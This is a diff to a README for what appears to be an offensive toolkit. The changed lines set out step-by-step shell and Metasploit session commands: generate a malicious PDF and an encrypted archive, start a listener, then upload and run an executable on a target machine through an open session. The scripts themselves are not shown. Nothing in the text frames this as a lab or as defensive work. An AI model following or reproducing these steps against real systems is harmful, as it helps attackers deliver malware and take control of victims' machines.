@@ -32,17 +32,23 @@ File can be downloaded at http://***host network IP***:80
 ## General Steps
 
 1. Begin by generating the malicious PDF and generate encrypted archive file by generating the exe of 'generate_malicious_pdf.sh'.
+  
+          chmod +x generate_malicious_pdf.sh
+  
+          ./generate_malicious_pdf.sh
 
 2. Start listener by running the listener.sh script
   
-  1. chmod +x listener.sh
+          chmod +x listener.sh
+          
+          ./listener.sh
   
 3. Upload the upload_exe.rc file to the target machine via session
   
-  1. sessions -i 1
+          sessions -i 1
   
-  2. upload upload_exe.rc
+          upload upload_exe.rc
   
 4. Run the resource script in order to upload and run the executable
   
-  1. resource upload_exe.rc
+          resource upload_exe.rc
